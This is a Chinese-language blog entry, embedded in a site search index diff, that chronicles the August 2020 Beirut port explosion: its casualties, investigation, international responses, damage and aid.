+<h2 id="事故经过"><a href="#事故经过" class="headerlink" title="事故经过"></a>事故经过</h2><p>黎巴嫩当地时间2020年8月4日下午6时左右，黎巴嫩首都贝鲁特港口区发生巨大爆炸，爆炸接连发生两次，导致多栋房屋受损，玻璃被震碎，天上升起红色烟雾。</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E8%B4%9D%E9%B2%81%E7%89%B9%E6%B8%AF%E5%8F%A3%E5%A4%A7%E7%88%86%E7%82%B8/%E7%88%86%E7%82%B8%E7%9E%AC%E9%97%B4.png" alt="爆炸瞬间"></p>
+<p>爆炸波及<strong>240公里</strong>，起先是一股浓烟向天上弥漫，随后浓烟当中出现零星的爆炸火光，大约5秒后，巨大的火龙冲天而起，夹杂着小型爆炸的冲击波在<strong>一秒内席卷了视线内可见的建筑物</strong>。外围的白色烟尘率先向外扩散，火红色的蘑菇云紧随其后。目击者巴查·甘塔司说：<code>“就像世界末日一样，到处都是摇摇晃晃受伤的人，满地都是玻璃、坏掉的汽车。太可怕了！” </code></p>
+<p>一位驻黎巴嫩的外媒记者幸运的离起爆地点较远，在他的描述中，爆炸更<code>“像一场特大地震。” </code></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E8%B4%9D%E9%B2%81%E7%89%B9%E6%B8%AF%E5%8F%A3%E5%A4%A7%E7%88%86%E7%82%B8/%E6%B8%AF%E5%8F%A3%E9%99%84%E8%BF%91%E5%AE%8C%E5%85%A8%E8%A2%AB%E7%82%B8%E6%AF%812.jpg" alt="港口附近完全被炸毁"></p>
+<p>爆炸导致贝鲁特多个街区严重受损，到处可见破损的建筑物和散落的玻璃碎片。在爆炸地点附近的阿什拉斐叶街区，居民比拉尔说，事发时整个街区<code>“就像遭受一场灾难”</code>，许多人受伤。据当地媒体报道，距爆炸地点<strong>10多公里</strong>的总统府建筑也受损。事发近两个小时后，现场依然浓烟滚滚，一些集装箱在爆炸中被掀飞、变形，旁边的仓库一片狼藉，纸箱等物品四处散落。</p>
+<h2 id="事故伤亡"><a href="#事故伤亡" class="headerlink" title="事故伤亡"></a>事故伤亡</h2><h6 id="截至2020年8月4日晚"><a href="#截至2020年8月4日晚" class="headerlink" title="截至2020年8月4日晚"></a>截至2020年8月4日晚</h6><p>初步统计显示，爆炸造成至少<strong>73人死亡，3000多人受伤</strong>。</p>
+<h6 id="截至2020年8月5日"><a href="#截至2020年8月5日" class="headerlink" title="截至2020年8月5日"></a>截至2020年8月5日</h6><p>黎巴嫩卫生部门称，爆炸已造成<strong>78人死亡、4000多人受伤</strong>。<strong>黎巴嫩总理哈桑·迪亚卜的妻子和女儿</strong>在爆炸中受伤，<strong>黎巴嫩长枪党秘书长</strong>在爆炸中身亡，<strong>国有电力公司董事长</strong>重伤垂死。贝鲁特省长表示，贝鲁特港口大爆炸发生后，<strong>10名救援人员遇难</strong>。联合国秘书长副发言人法尔汉·哈克（Farhan Haq）表示，共有<strong>48名联合国工作人员</strong>在爆炸中受伤。</p>
+<h6 id="截至2020年8月5日上午"><a href="#截至2020年8月5日上午" class="headerlink" title="截至2020年8月5日上午"></a>截至2020年8月5日上午</h6><p>黎巴嫩《每日星报》等多家媒体援引黎巴嫩红十字会的消息报道称，事故已造成超过<strong>100人死亡，4000多人受伤</strong>。</p>
+<h6 id="截至2020年8月5日-1"><a href="#截至2020年8月5日-1" class="headerlink" title="截至2020年8月5日"></a>截至2020年8月5日</h6><p>中国驻黎巴嫩大使馆证实，<strong>一名中国公民</strong>在黎巴嫩首都贝鲁特港口区爆炸中受轻伤。伤者是一名在黎中资企业员工，被碎玻璃划伤，在接受救治。</p>
+<h6 id="截至2020年8月5日-2"><a href="#截至2020年8月5日-2" class="headerlink" title="截至2020年8月5日"></a>截至2020年8月5日</h6><p><strong>荷兰驻黎巴嫩大使的夫人</strong>在爆炸中身受重伤，已经被送往医院救治。荷兰外交部发言人还表示，爆炸导致荷兰驻黎巴嫩大使馆严重受损，还造成<strong>使馆方面4人受伤</strong>。当地时间2020年8月8日，荷兰外交部表示，<strong>荷兰驻黎巴嫩大使夫人海德维赫斯·瓦尔特曼·莫利雷</strong>在贝鲁特大爆炸中受重伤，于当地时间8日去世。</p>
+<h6 id="截至2020年8月5日-3"><a href="#截至2020年8月5日-3" class="headerlink" title="截至2020年8月5日"></a>截至2020年8月5日</h6><p>黎巴嫩卫生部长表示，爆炸造成的<strong>死亡人数已经升至135人，约5000人受伤</strong>，仍有<strong>数十人下落不明</strong>。</p>
+<h6 id="截至2020年8月6日"><a href="#截至2020年8月6日" class="headerlink" title="截至2020年8月6日"></a>截至2020年8月6日</h6><p>德国外交部表示，<strong>德国驻贝鲁特大使馆的一名工作人员</strong>因爆炸死亡。该爆炸造成的<strong>死亡人数上升至137人，另有至少5000人受伤</strong>。随着搜寻失踪人员的工作继续进行，死亡人数预计还会上升。</p>
+<h6 id="截至2020年8月7日"><a href="#截至2020年8月7日" class="headerlink" title="截至2020年8月7日"></a>截至2020年8月7日</h6><p>该爆炸造成的<strong>死亡人数上升至157人，5000多人受伤</strong>，另有<strong>数十人依然下落不明</strong>。</p>
+<h6 id="截至2020年8月9日"><a href="#截至2020年8月9日" class="headerlink" title="截至2020年8月9日"></a>截至2020年8月9日</h6><p>黎巴嫩卫生部媒体办公室公布贝鲁特港口爆炸事件最新死伤数字，<strong>遇难人数上升至158人，逾6000人受伤</strong>，仍有<strong>21人失踪</strong>。</p>
+<h6 id="截至2020年08月11日下午"><a href="#截至2020年08月11日下午" class="headerlink" title="截至2020年08月11日下午"></a>截至2020年08月11日下午</h6><p>黎巴嫩看守政府卫生部长公布贝鲁特港口爆炸最新死伤数字，<strong>遇难人数已上升至171人，失踪人数在30到40人之间</strong>。<strong>大约1500名伤者</strong>需要特殊护理，<strong>120名患者</strong>仍处于<strong>重症状态</strong>。 </p>
+<h6 id="截至2020年08月17日"><a href="#截至2020年08月17日" class="headerlink" title="截至2020年08月17日"></a>截至2020年08月17日</h6><p>黎巴嫩大爆炸已造成至少<strong>177人死亡、6000多人受伤</strong>，另有<strong>数十人失踪</strong>。</p>
+<h6 id="截至2020年08月30日"><a href="#截至2020年08月30日" class="headerlink" title="截至2020年08月30日"></a>截至2020年08月30日</h6><p>贝鲁特港口爆炸事件中的<strong>死亡人数已上升至190人，超过6500人受伤，3人失踪</strong>。</p>
+<h2 id="事故处置"><a href="#事故处置" class="headerlink" title="事故处置"></a>事故处置</h2><h4 id="现场救援"><a href="#现场救援" class="headerlink" title="现场救援"></a>现场救援</h4><p>截至黎巴嫩当地时间2020年8月4日晚上9时30分，爆炸现场大火还在燃烧，消防车辆、救护车辆以及工程车辆在赶往现场，救护伤员并对现场进行清理。现场已被<strong>部队封锁</strong>，多个建筑受损。贝鲁特医院急诊已人满为患，伤者被送往城外医院进行救治。</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E8%B4%9D%E9%B2%81%E7%89%B9%E6%B8%AF%E5%8F%A3%E5%A4%A7%E7%88%86%E7%82%B8/%E7%88%86%E7%82%B8%E5%90%8E%E7%8E%B0%E5%9C%BA.png" alt="爆炸后现场"></p>
+<p>2020年8月4日，黎巴嫩最高国防委员会已宣布贝鲁特<strong>进入紧急状态</strong>。</p>
+<p>2020年8月17日，黎巴嫩当局宣布，将这一<strong>紧急状态延长</strong>一个月至9月18日。</p>
+<h4 id="涉案调查"><a href="#涉案调查" class="headerlink" title="涉案调查"></a>涉案调查</h4><p>2020年8月17日，<strong>黎巴嫩海关关长达希尔</strong>因涉嫌黎首都贝鲁特港口区爆炸案于当天被捕，负责贝鲁特港口区爆炸案调查的法官索万当天在对达希尔进行<strong>约4个半小时问询</strong>后下令将其逮捕。索万迄今已对<strong>25名涉案人员</strong>提出指控，其中包括<strong>前海关关长迈尔希、贝鲁特港总经理库雷特姆</strong>等。</p>
+<p>2020年9月1日，一名黎巴嫩司法消息人士称，通过调查爆炸案而确定的<strong>25名相关人员</strong>，目前都已被黎巴嫩当局拘留。该消息人士称，当地时间2020年9月1日，首席调查法官法蒂·萨万对<strong>最后4名涉事者</strong>进行审问后，对他们发出了逮捕令。据报道，这4人分别是<strong>港口军事情报部门的负责人</strong>、<strong>国家安全局的少校</strong>和<strong>2名安全总局</strong>的成员。据称，他们所属的安全机构，以及黎巴嫩军队和黎巴嫩海关当局，是负责监督港口安全的主要机构。</p>
+<p>2020年10月1日，贝鲁特港爆炸案调查官法迪（Fadi Sawan）向存放<strong>硝酸铵</strong>的涉案船只的船东和船长签发逮捕令，并请求国际刑警组织协助逮捕，二人均为俄罗斯籍。</p>
+<h2 id="事故回应"><a href="#事故回应" class="headerlink" title="事故回应"></a>事故回应</h2><h4 id="黎巴嫩"><a href="#黎巴嫩" class="headerlink" title="黎巴嫩"></a>黎巴嫩</h4><p>2020年8月4日，黎巴嫩卫生部长哈桑说，因贝鲁特的医院收治能力有限，他呼吁将伤亡人员分散至周边医院，同时号召<strong>所有医护人员</strong>参与救治伤员。</p>
+<p>2020年8月4日，黎总理迪亚卜视察爆炸现场，随后宣布8月5日为<strong>全国哀悼日</strong>，政府将拨付<strong>1000亿里拉</strong>的紧急救援资金，并表示黎巴嫩将向国际社会寻求帮助。</p>
+<p>2020年8月4日晚，黎巴嫩总统奥恩在总统府推特账号上发文说，港口仓库内存放<strong>2750吨硝酸铵</strong>长达<strong>6年</strong>之久且缺乏安全措施，“令人难以接受”。他呼吁在贝鲁特实施为期两周的紧急状态，并严惩爆炸责任人。</p>
+<p>当地时间2020年8月7日，黎巴嫩总统米歇尔·奥恩表示，<strong>拒绝</strong>有关就贝鲁特爆炸事件展开国际调查的呼吁。</p>
+<h4 id="联合国"><a href="#联合国" class="headerlink" title="联合国"></a>联合国</h4><p>事故发生后，<strong>联合国秘书长</strong>安东尼奥·古特雷斯向遇难人员表示哀悼。</p>
+<p><strong>第74届联合国大会主席</strong>穆罕默德·班迪也对爆炸事件表示关注。他向在爆炸中失去亲人的家庭表示最深切的慰问，并祝愿伤者早日康复。他同时向黎巴嫩表达声援。</p>
+<h4 id="德国"><a href="#德国" class="headerlink" title="德国"></a>德国</h4><p>德国外交部表示，爆炸发生地点位于德国驻贝鲁特使馆附近，不能排除死伤人员中有德国公民。</p>
+<h4 id="美国"><a href="#美国" class="headerlink" title="美国"></a>美国</h4><p>美国东部时间2020年8月4日下午，美国总统特朗普在举行的白宫记者会上说，美国对贝鲁特发生巨大爆炸深表同情，为所有受害者及其家属祈祷，并表示美国随时准备援助黎巴嫩。</p>
+<h4 id="俄罗斯"><a href="#俄罗斯" class="headerlink" title="俄罗斯"></a>俄罗斯</h4><p>2020年8月4日，克里姆林宫网站发布公告说，俄罗斯总统普京就黎巴嫩首都港口区发生爆炸向黎巴嫩总统奥恩致慰问电。普京说：<code>“请转达对遇难者家属和亲人的同情和支持，并祝所有伤者早日康复。”</code></p>
+<h4 id="以色列"><a href="#以色列" class="headerlink" title="以色列"></a>以色列</h4><p>2020年8月4日晚，以色列总理办公室发表声明说，总理内塔尼亚胡在批准向黎巴嫩<strong>提供人道主义和医疗援助</strong>后，将通过联合国特别协调员为黎巴嫩<strong>进一步提供援助</strong>。以色列外交部和国防部发表一份联合声明说，以色列已经通过国际安全和外交等渠道向黎巴嫩政府提供人道主义和医疗援助。据以色列媒体报道，以色列是通过联合国驻黎巴嫩临时部队（联黎部队）、联合国和法国等渠道向黎巴嫩提供援助的。<strong>以色列尚未与黎巴嫩建交</strong>。</p>
+<h4 id="中国"><a href="#中国" class="headerlink" title="中国"></a>中国</h4><p>2020年8月5日，中国驻黎巴嫩大使馆通报，<strong>中国赴黎巴嫩维和部队</strong>迅速组织官兵掌握事故情况，清点物资和机械，确保接到救援命令后能立即出动。</p>
+<p>2020年8月5日，中国外交部发言人汪文斌在外交部例行记者会上表示，中方对黎巴嫩发生重大爆炸造成大量人员伤亡事件，深感震惊和悲痛。对遇难者表示深切哀悼，向伤者和遇难者家属表示诚挚的慰问。祝愿伤者早日康复。中方愿为黎方妥处有关事件，实现国家的发展积极提供<strong>力所能及的帮助</strong>。</p>
+<p>2020年8月5日，国家主席习近平就黎巴嫩贝鲁特发生重大爆炸事件向黎巴嫩总统奥恩致慰问电：<code>“谨代表中国政府和中国人民，并以我个人的名义，对遇难者表示深切的哀悼，向伤者和遇难者家属致以诚挚的慰问，祝愿伤者早日康复。”</code></p>
+<h2 id="事故影响"><a href="#事故影响" class="headerlink" title="事故影响"></a>事故影响</h2><p><strong>美国地质调查局</strong>收集的数据显示，爆炸产生的地震波相当于<strong>3.3级地震</strong>，实际威力更是<strong>大于3.3级地震</strong>。附近居民形容爆炸事故<code>“就像一颗原子弹（爆炸）”</code>。</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E8%B4%9D%E9%B2%81%E7%89%B9%E6%B8%AF%E5%8F%A3%E5%A4%A7%E7%88%86%E7%82%B8/%E7%88%86%E7%82%B8%E5%89%8D%E5%8D%AB%E6%98%9F%E5%9B%BE.jpg" alt="爆炸前卫星图"></p>
+<p>根据法新社提供的现场情况，爆炸发生的<strong>港口已经被夷为平地</strong>，距离爆炸地点<strong>半径10公里以内</strong>的建筑物<strong>全部被破坏</strong>，碎玻璃、石块挤满了街道。港口<strong>半径100米内</strong>的建筑在<strong>1秒内被夷为平地</strong>，<strong>6公里以外</strong>的机场受损。</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E8%B4%9D%E9%B2%81%E7%89%B9%E6%B8%AF%E5%8F%A3%E5%A4%A7%E7%88%86%E7%82%B8/%E7%88%86%E7%82%B8%E5%90%8E%E5%8D%AB%E6%98%9F%E5%9B%BE.jpg" alt="爆炸后卫星图"></p>
+<p>贝鲁特美国大学医学中心医院因为爆炸，急救室被<strong>炸去了一半</strong>，剩余的部分无法收容几百个挤在门口的病人。该医学中心门口的救护车、军车、小轿车上都<strong>挤满了受伤的病人</strong>，但也没有医院可以转移了。更为严重的是爆炸<strong>破坏了电力系统</strong>，医院的许多<strong>抢救设备无法使用</strong>。</p>
+<p>从黎巴嫩国家媒体提供的照片来看，<strong>总理府的门窗</strong>全部被爆炸震的掉在地上；<strong>总统官邸巴卜达宫</strong>的破坏更为严重；<strong>黎巴嫩前总理的房子</strong>也因爆炸损坏。</p>
+<p>截至2020年8月5日，现场状况相对稳定，官方没有公布是否有次生灾害的可能性。贝鲁特市长表示，爆炸造成<strong>30万人</strong>无家可归。据公开资料显示，黎巴嫩首都贝鲁特的人口占黎全国人口的40%，约有150万人，因此受该事故影响而无家可归的<strong>30万人</strong>，占贝鲁特人口的20%。损失高达<strong>30亿美元</strong>。此外，爆炸导致该国仅剩<strong>不足一个月的粮食储备</strong>。</p>
+<p>2020年8月5日，贝鲁特市长阿布德对媒体表示，该次爆炸造成的经济损失预计将达到<strong>100亿至150亿美元</strong>。<code>“贝鲁特已经成为一个满目疮痍的城市，半个城市都被毁了，数十万民众在2-3个月内都无法回到自己家中，这是黎巴嫩现代史上遭遇的最大危机”</code>。</p>
+<p>2020年8月8日，黎巴嫩首都贝鲁特有数千人参加集会，要求<strong>政府辞职</strong>和<strong>实施改革</strong>。集会很快演变成示威者与执法人员的<strong>大规模冲突</strong>。示威者占领了四个部委和银行协会的办公楼。冲突造成<strong>700多人受伤</strong>和<strong>一名执法人员死亡</strong>。</p>
+<p>当地时间2020年8月10日晚，黎巴嫩总理哈桑·迪亚卜发表电视讲话，宣布<strong>该届政府辞职</strong>。</p>
+<p>当地时间2020年8月30日，黎巴嫩部长会议主席发布报告，贝鲁特港口爆炸造成<strong>30万人</strong>无家可归，损失高达<strong>150亿美元</strong>。此外有<strong>5万栋房屋</strong>、<strong>9家大型医院</strong>和<strong>178所学校</strong>受损。</p>
+<h2 id="事故原因"><a href="#事故原因" class="headerlink" title="事故原因"></a>事故原因</h2><p>2020年8月4日，<strong>以色列</strong>方面发布消息，与该事件无关。</p>
+<p>有报道称，爆炸是由于化学物质的自燃而导致的。黎巴嫩安全部门负责人阿巴斯·易卜拉欣表示，港口仓库中储存着可燃化学物质。黎巴嫩总理哈桑·迪亚卜指出爆炸发生地附近储存了<strong>约2750吨</strong>的硝酸铵，这些硝酸铵在<strong>多年前</strong>被黎巴嫩海关扣押，储存在港口区内，爆炸或与硝酸铵储存不当有关。</p>
+<p>2020年8月17日，当地媒体报道，黎巴嫩司法部门宣布了贝鲁特爆炸案的初步调查结果，确认不存在传言中的导弹或飞机，也不存在袭击导致这场灾难的可能性。调查结果显示，贝鲁特港口<strong>12号仓库</strong>的管理存在<strong>严重疏忽</strong>，因为仓库内除了发生爆炸的<strong>2750吨硝酸铵</strong>，还存放了<strong>大量</strong>的烟花和爆竹。</p>
+<h2 id="国际援助"><a href="#国际援助" class="headerlink" title="国际援助"></a>国际援助</h2><h4 id="伊拉克"><a href="#伊拉克" class="headerlink" title="伊拉克"></a>伊拉克</h4><p>伊拉克当地时间2020年8月4日晚间，<strong>伊拉克总理卡迪米</strong>、<strong>总统萨利赫</strong>及<strong>议长哈布希</strong>分别就贝鲁特发生爆炸一事声援黎巴嫩政府及人民，向事件遇难者表示哀悼，并表明伊拉克政府对黎巴嫩的坚定支持。总理卡迪米向伊拉克卫生部做出指示，迅速组建一支医疗队，为黎巴嫩提供紧急援助。医疗队由多科室的医护人员组成，将携带必要的药品与医疗用品，于2020年8月5日启程前往黎巴嫩，为当地民众提供医疗救援。</p>
+<h4 id="英国"><a href="#英国" class="headerlink" title="英国"></a>英国</h4><p>据BBC报道，英国首相表示，<strong>随时准备</strong>为黎巴嫩提供任何必要援助。</p>
+<h4 id="伊朗"><a href="#伊朗" class="headerlink" title="伊朗"></a>伊朗</h4><p>据BBC报道，伊朗外长表示，<strong>随时准备</strong>为黎巴嫩提供任何必要援助</p>
+<h4 id="加拿大"><a href="#加拿大" class="headerlink" title="加拿大"></a>加拿大</h4><p>加拿大当地时间2020年8月5日晚，<strong>加拿大政府</strong>在渥太华宣布，将为黎巴嫩贝鲁特发生的重大爆炸事件向黎方提供<strong>500万加元</strong>的<strong>人道主义援助</strong>。<strong>加拿大全球事务部(外交部)**表示，这笔援助中，包括经加拿大红十字会向黎巴嫩红十字会等当地人道主义合作伙伴提供的</strong>150万加元**首期资金，旨在帮助满足受此次事件影响的民众的紧急需求。加方表示，其捐款将用于支持贝鲁特当地紧急医疗服务，并提供庇护所、食品和其他必需品等援助。</p>
+<h4 id="中国-1"><a href="#中国-1" class="headerlink" title="中国"></a>中国</h4><p>2020年8月6日，中国<strong>第18批赴黎巴嫩维和医疗分队</strong>接到<strong>联合国驻黎巴嫩临时部队司令部</strong>通知，中国赴黎维和医疗分队清点药品准备救援；8月9日，中国政府中东问题特使翟隽在紧急援助黎巴嫩<strong>高级别视频协调</strong>会上宣布<strong>中国政府</strong>将为黎巴嫩提供<strong>100万美元现汇</strong>援助，用于支持黎方救治贝鲁特港爆炸事件中的受伤民众，并向蒙受巨大损失或流离失所的家庭提供援助。</p>
+<h4 id="世界银行"><a href="#世界银行" class="headerlink" title="世界银行"></a>世界银行</h4><p>2020年8月5日，世界银行表示，他们已准备评估黎巴嫩首都贝鲁特港口爆炸事故的损失和重建需求，将努力<strong>动员公共及私人融资</strong>以帮助其开展城市<strong>灾后重建</strong>。世界银行在一份官方声明中表示，将对现有资源进行重新规划，寻求更多的资金来帮助这个城市的受灾民众重建生活。但世界银行目前并未说明哪些资源将用于黎巴嫩首都的灾后重建。</p>
+<h4 id="紧急援助黎巴嫩高级别视频协调会"><a href="#紧急援助黎巴嫩高级别视频协调会" class="headerlink" title="紧急援助黎巴嫩高级别视频协调会"></a>紧急援助黎巴嫩高级别视频协调会</h4><p>2020年8月9日，<strong>紧急援助黎巴嫩高级别视频协调会</strong>由联合国和法国共同举办，来自_联合国、法国、美国、中国、俄罗斯、西班牙、意大利、埃及、卡塔尔以及国际货币基金组织、世界银行、国际红十字与红新月会、欧盟_等<strong>国家</strong>和<strong>国际组织的三十多位国家元首、政府首脑或代表以及负责人</strong>与会。与会各方承诺短期内为黎巴嫩提供<strong>2.527亿欧元</strong>紧急援助。</p>
+<h4 id="联合国-1"><a href="#联合国-1" class="headerlink" title="联合国"></a>联合国</h4><p>2020年8月11日，正在黎巴嫩的<strong>世界粮食计划署总干事比斯利</strong>又证实，已经向黎巴嫩筹调运输了<strong>1.75万吨面粉</strong>；此外，粮食计划署还将向黎巴嫩提供能<strong>满足三个月需求</strong>的小麦和谷物。运送粮食的船已改道至黎巴嫩另一座重要港口城市的黎波里和南部的赛达港卸货——而据黎巴嫩媒体报道，贝鲁特港预计本周也将开始<strong>恢复使用</strong>。</p>
+]]></content>
+      <categories>
+        <category>纪实</category>
+        <category>灾难</category>
+      </categories>
+      <tags>
+        <tag>灾难</tag>
+        <tag>纪实</tag>
+      </tags>
+  </entry>
+</search>
